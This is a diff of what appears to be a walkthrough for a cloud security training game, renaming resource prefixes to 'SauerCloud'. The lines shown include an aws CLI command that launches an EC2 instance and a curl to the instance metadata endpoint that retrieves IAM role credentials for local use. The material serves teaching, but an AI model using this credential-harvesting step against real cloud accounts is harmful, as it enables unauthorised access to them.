@@ -27,7 +27,7 @@ Two security groups are available: "filtered", and "allow". The "allow" group wi
 NB: The programmer would like to highlight the fact that the user's IP is still used, despite the loss of realism, in order to ensure the security of their account. :)
 
 
-$ `aws --profile juan ec2 run-instances --image-id $ami_id --instance-type t2.micro --subnet-id $subnet_id --security-group-id $sg-id --key-name AWS-secgame-mission4-keypair-Evilcorp-Evilkeypair-$id --associate-public-ip-address`
+$ `aws --profile juan ec2 run-instances --image-id $ami_id --instance-type t2.micro --subnet-id $subnet_id --security-group-id $sg-id --key-name SauerCloud-mission4-keypair-Evilcorp-Evilkeypair-$id --associate-public-ip-address`
 
 Start a new instances using the "allow" security group, and parameters allowing it to connect to the other instance. You may also create a new keypair yourself. Using "t2.micro" as type serves to ensure you remain in free tier. You need to associate a public ip adddress to ensure you can connect using SSH.
 
@@ -51,7 +51,7 @@ Use the instance's credentials to execute commands.
 
 ## Alternative: Get the credentials and load them on your own shell
 
-$ `curl 169.254.169.254/latest/meta-data/iam/security-credentials/AWS-secgame-mission4-role-ec2-$id` 
+$ `curl 169.254.169.254/latest/meta-data/iam/security-credentials/SauerCloud-mission4-role-ec2-$id` 
 
 This allows you to get the IAM credentials and write them to your local ~/.aws/credentials file under a named profile.
 
